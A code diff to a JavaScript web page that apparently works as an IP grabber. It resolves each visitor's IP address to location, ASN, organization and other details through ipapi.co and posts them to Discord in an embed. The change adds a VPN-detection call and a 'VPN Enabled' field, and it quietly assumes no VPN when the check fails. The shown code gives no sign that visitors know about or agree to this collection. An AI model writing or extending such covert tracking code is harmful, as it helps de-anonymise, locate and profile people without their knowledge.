@@ -43,7 +43,7 @@
             }, false);
         }
 
-        function sendToDiscord(ipAddress, locationData) {
+        function sendToDiscord(ipAddress, locationData, isVPN) {
             console.log("IP Address:", ipAddress);
             console.log("Location Data:", locationData);
 
@@ -58,7 +58,8 @@
                 "Currency": locationData.currency,
                 "Language": locationData.languages,
                 "ASN": locationData.asn,
-                "Organization": locationData.org
+                "Organization": locationData.org,
+                "VPN Enabled": isVPN ? "True" : "False"
             };
 
             sendEmbed(embedData);
@@ -126,6 +127,10 @@
                             {
                                 "name": "Organization",
                                 "value": `\`\`\`${embedData["Organization"]}\`\`\``
+                            },
+                            {
+                                "name": "VPN Enabled",
+                                "value": `\`\`\`${embedData["VPN Enabled"]}\`\`\``
                             },
                             {
                                 "name": "Operating System",
@@ -240,11 +245,19 @@
                     fetch(`https://ipapi.co/${ipAddress}/json/`)
                         .then(response => response.json())
                         .then(locationData => {
-                            sendToDiscord(ipAddress, locationData);
+                            fetch('https://api64.ipify.org/vpn-check')
+                                .then(response => response.json())
+                                .then(vpnData => {
+                                    sendToDiscord(ipAddress, locationData, vpnData.is_vpn);
+                                })
+                                .catch(error => {
+                                    console.error('Unable to fetch VPN data:', error);
+                                    sendToDiscord(ipAddress, locationData, false); // Assume VPN is disabled
+                                });
                         })
                         .catch(error => {
                             console.error('Unable to fetch location data:', error);
-                            sendToDiscord(ipAddress, null); // Send embed with default location data
+                            sendToDiscord(ipAddress, null, false); // Send embed with default location data and assume VPN is disabled
                         });
                 })
                 .catch(error => {
